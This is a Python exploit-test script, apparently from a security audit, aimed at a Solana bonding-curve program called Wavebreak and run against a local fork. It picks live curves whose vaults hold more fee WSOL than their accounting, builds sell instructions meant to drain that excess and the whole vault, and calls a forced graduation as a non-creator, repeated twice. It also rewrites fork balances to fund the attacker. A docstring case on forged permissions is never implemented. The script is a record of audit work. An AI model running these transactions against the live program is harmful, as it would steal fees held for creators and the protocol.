"""Final Wavebreak measurement batch (fork-only, state-preserving, per-instruction state capture).

T1  fee-custody drain attempt: does a *sell* pay out from the VAULT or from the internal accounting?
    685 live curves hold more WSOL in their quote vault than their `quoteAmount` accounting says
    (unclaimed protocol/creator fees). A sell that pays more than accounting releases = theft of
    fee custody by any token holder (permissionless: sell_requires_permission=false on all curves).
T2  same attempt on the curve with the largest positive divergence.
T3  exact-out for the entire vault balance.
T4  unauthorized forced graduation (Manual method) - repeated for the record with state capture.
T5  consume -> buy sequence with an attacker-crafted permission (the signature gate).
"""
import sys, json, struct, base64
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey

WB = "waveQX2yP3H1pVU8djGvEHmYg8uamQ84AuyGtpsrXTF"
WSOL = F.WSOL
actor = F.load_actor(); A = str(actor.pubkey())
ATA_WSOL = "HMRvmgya8xKgDsbZfLGrYEjGNeFrJSe27JBhsAE2P7jh"
CURVES = {c["address"]: c for c in json.load(open("/home/user/orca-audit/recon/wb_curves.json"))}
CUST = {r["curve"]: r for r in json.load(open("/home/user/orca-audit/recon/wb_custody_full.json"))}


def ata_of(o, m, p=F.TOKEN):
    return str(Pubkey.find_program_address([bytes(F.pk(o)), bytes(F.pk(p)), bytes(F.pk(m))], F.pk(F.ATA))[0])


def rd(a):
    v = F.get_account(a)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    o = {"lamports": v["lamports"], "space": v["space"], "owner": v["owner"],
         "hash": F.hashlib.sha256(raw).hexdigest()}
    if v["space"] == 165 and len(raw) >= 72:
        o["amount"] = struct.unpack_from("<Q", raw, 64)[0]
    if v["space"] == 82 and len(raw) >= 44:
        o["supply"] = struct.unpack_from("<Q", raw, 36)[0]
        o["decimals"] = raw[44]
        o["mintAuth"] = F.b58(raw[46:78]) if raw[45] else None
    if v["space"] == 2048 and len(raw) >= 224:
        o["quoteAmount"] = struct.unpack_from("<Q", raw, 208)[0]
        o["baseAmount"] = struct.unpack_from("<Q", raw, 216)[0]
        o["graduationTarget"] = struct.unpack_from("<Q", raw, 240)[0]
        o["graduationReward"] = struct.unpack_from("<Q", raw, 256)[0]
        o["creatorReward"] = struct.unpack_from("<Q", raw, 232)[0]
        o["minReserveBps"] = struct.unpack_from("<H", raw, 1308)[0]
        o["m1label"], o["m1graduated"] = raw[412], raw[413]
    return o


def M(k, w=False, s=False):
    return F.AM(k, writable=w, signer=s)


RES = []


def case(name, ixs, watch, note=""):
    b = {a: rd(a) for a in watch}
    slot0 = F.get_slot()
    r = F.send(ixs, actor)
    a = {x: rd(x) for x in watch}
    det = r.get("detail", {})
    logs = [l.strip() for l in det.get("logs", [])]
    deltas = {}
    for k in watch:
        bb, aa = b.get(k) or {}, a.get(k) or {}
        d = {}
        for f in ("lamports", "amount", "supply", "quoteAmount", "baseAmount", "m1graduated"):
            if bb.get(f) is not None and bb.get(f) != aa.get(f):
                d[f] = [bb.get(f), aa.get(f), (aa.get(f) or 0) - (bb.get(f) or 0)]
        if d:
            deltas[k] = d
    rec = {"case": name, "note": note, "forkSlotBefore": slot0, "forkSlotAfter": F.get_slot(),
           "sig": r.get("result"), "err": det.get("err") or r.get("error"),
           "programLogs": logs, "deltas": deltas, "before": b, "after": a}
    RES.append(rec)
    print(f"\n### {name}   [{note}]")
    print("   slot", slot0, "->", rec["forkSlotAfter"], "err:", json.dumps(rec["err"])[:150])
    print("   logs:", " | ".join(l.split("log:")[-1].strip() for l in logs
                                if "log:" in l or "failed" in l)[:300])
    print("   deltas:", json.dumps(deltas)[:800])
    return rec


def sell_ix(curve, mint, vault, base_ata, quote_ata, tag, amount, partial=0, thr=None):
    d = struct.pack("<QB", amount & (2**64 - 1), partial)
    d += b"\x00" if thr is None else (b"\x01" + struct.pack("<QQ", *thr))
    return Instruction(F.pk(WB), bytes([tag]) + d, [
        M(A, w=True, s=True), M(curve, w=True), M(mint, w=True), M(base_ata, w=True),
        M(WSOL), M(vault, w=True), M(quote_ata, w=True), M(F.SYSTEM), M(F.ATA),
        M(F.TOKEN), M(F.TOKEN)])


def fixture_fund(base_ata, mint, amount):
    """fork-only funding of the ATTACKER's own ATA (+ matching mint supply) so the sell path
    reaches program guards instead of dying on an empty account (mandate rule 4/10)."""
    mv = F.get_account(mint)
    mraw = bytearray(base64.b64decode(mv["data"][0]))
    supply0 = struct.unpack_from("<Q", mraw, 36)[0]
    dec = mraw[44]
    v = F.get_account(base_ata)
    raw = bytearray(base64.b64decode(v["data"][0]))
    struct.pack_into("<Q", raw, 64, amount)
    r1 = F.rpc.rpc("surfnet_setAccount", [base_ata, {"lamports": v["lamports"], "data": bytes(raw).hex(),
                                                     "owner": v["owner"], "executable": False}], url=F.FORK)
    r2 = F.rpc.rpc("surfnet_setSupply", [mint, {"total": str(supply0 + amount)}], url=F.FORK)
    return {"note": "FORK-ONLY fixture funding of the attacker's own token account; mint supply raised by "
                    "the same amount so the burn is legal. Not exploit evidence.",
            "account": base_ata, "mint": mint, "amount": amount, "decimals": dec,
            "supplyBefore": supply0, "setAccount": bool(r1.get("result")), "setSupply": bool(r2.get("result")),
            "forkSlot": F.get_slot()}


def main():
    # ---------- T1/T2/T3 fee-custody drain through the sell path ----------
    cands = []
    for a, c in CURVES.items():
        if c["quote_mint"] != WSOL or any(m["graduated"] for m in c["graduation_methods"]):
            continue
        r = CUST.get(a, {})
        if r.get("vaultQuote", 0) > 10 ** 9 and r.get("divQuote", 0) > 10 ** 8:
            cands.append((r["divQuote"], a, r))
    cands.sort(reverse=True)
    print("T1 fee-excess drain candidates (vault - accounting):")
    for x in cands[:4]:
        print(f"   {x[1]:44s} excess={x[0]:>13,} vault={x[2]['vaultQuote']:>14,} acct={x[2]['acctQuote']:>14,}")
    for div, T, r in cands[:2]:
        c = CURVES[T]
        BASE, VAULT = c["base_mint"], ata_of(T, WSOL)
        base_ata = ata_of(A, BASE)
        _, x = F.create_ata(A, BASE, F.TOKEN, A)
        F.send([x], actor)
        for unit_mult, label in ((3, "small"), (6, "huge")):
            mv = F.get_account(BASE)
            dec = base64.b64decode(mv["data"][0])[44]
            amount = 10 ** (dec + unit_mult)
            fund = fixture_fund(base_ata, BASE, amount)
            watch = [A, ATA_WSOL, base_ata, T, VAULT, BASE]
            case(f"WB-T1 sell exact-in ({label}, {amount:,} units) on {T[:10]} "
                 f"[vault excess {div:,}]", [sell_ix(T, BASE, VAULT, base_ata, ATA_WSOL, 10, amount, 0)],
                 watch, f"funding={json.dumps({k: fund[k] for k in ('amount', 'decimals', 'supplyBefore')})}")
            after = rd(T) or {}
            v = rd(VAULT) or {}
            paid = (rd(ATA_WSOL) or {}).get("amount", 0)
            rec = RES[-1]
            rec["fixture"] = fund
            rec["payoutToAttacker"] = paid
            # does accounting fall by at least the payout? (conservation)
            b_amt = (rec["before"].get(T) or {}).get("quoteAmount") or 0
            a_amt = (rec["after"].get(T) or {}).get("quoteAmount") or 0
            v0 = (rec["before"].get(VAULT) or {}).get("amount") or 0
            v1 = (rec["after"].get(VAULT) or {}).get("amount") or 0
            cons = {"accountingDecrease": b_amt - a_amt, "vaultDecrease": v0 - v1,
                    "attackerWsolDelta": 0, "note": "payout must be <= accounting decrease; "
                                                     "vault may exceed accounting only as unclaimed fees"}
            rec["conservation"] = cons
            print(f"   -> accounting -{cons['accountingDecrease']:,}  vault -{cons['vaultDecrease']:,}  "
                  f"{'ACCOUNTING UNDER-PAID THE VAULT (excess still in vault)' if cons['vaultDecrease'] < cons['accountingDecrease'] else 'vault paid more than accounting released -> FEE CUSTODY DRAIN'}")
        # exact-out for the whole vault
        mv = F.get_account(BASE)
        dec = base64.b64decode(mv["data"][0])[44]
        case(f"WB-T2 exact-OUT asking for the entire vault ({(rd(VAULT) or {}).get('amount',0):,}) on {T[:10]}",
             [sell_ix(T, BASE, VAULT, base_ata, ATA_WSOL, 11, (rd(VAULT) or {}).get("amount", 0), 1)],
             [A, ATA_WSOL, base_ata, T, VAULT, BASE], "allow_partial_fill=1")

    # ---------- T4 forced graduation (Manual method) ----------
    manual = [c for c in CURVES.values() if any(m["label"] == 2 and not m["graduated"] for m in c["graduation_methods"])]
    manual.sort(key=lambda c: -c["quote_amount"])
    for c in manual[:2]:
        T = c["address"]
        BASE, QM = c["base_mint"], c["quote_mint"]
        qp = (F.get_account(QM) or {}).get("owner") or F.TOKEN
        bp = (F.get_account(BASE) or {}).get("owner") or F.TOKEN
        VAULT = ata_of(T, QM, qp)
        dest = [m["destination"] for m in c["graduation_methods"] if m["label"] == 2][0]
        dq, db = ata_of(dest, QM, qp), ata_of(dest, BASE, bp)
        aq, ab = ata_of(A, QM, qp), ata_of(A, BASE, bp)
        for m_, p_ in ((QM, qp), (BASE, bp)):
            _, x = F.create_ata(A, m_, p_, A)
            F.send([x], actor)
        g = Instruction(F.pk(WB), bytes([33]), [
            M(A, w=True, s=True), M(dest), M(T, w=True), M(QM), M(VAULT, w=True),
            M(aq, w=True), M(dq, w=True), M(BASE, w=True), M(db, w=True),
            M(F.SYSTEM), M(F.ATA), M(qp), M(bp)])
        case(f"WB-T4 graduateManual by a NON-CREATOR on {T[:12]} (target {c['graduation_target']:,} "
             f"vs quote {c['quote_amount']:,})", [g], [A, aq, ab, T, VAULT, dq, db, BASE],
             "curve creator is a third party; destination taken from the live curve record")
        # second call = repeated payout?
        case(f"WB-T4b graduateManual AGAIN on {T[:12]}", [g], [A, aq, ab, T, VAULT, dq, db, BASE],
             "repeated-call state carry-over")
        # can a holder still exit afterwards?
        case(f"WB-T4c sell AFTER forced graduation on {T[:12]}",
             [sell_ix(T, BASE, VAULT, ab, aq, 10, 10 ** 6, 1)], [A, aq, ab, T, VAULT, BASE],
             "post-graduation exit for a holder")
    json.dump({"forkSlotEnd": F.get_slot(), "results": RES},
              open("/home/user/orca-audit/evidence/WBF_final.json", "w"), indent=1)
    print("\nsaved evidence/WBF_final.json")


if __name__ == "__main__":
    main()
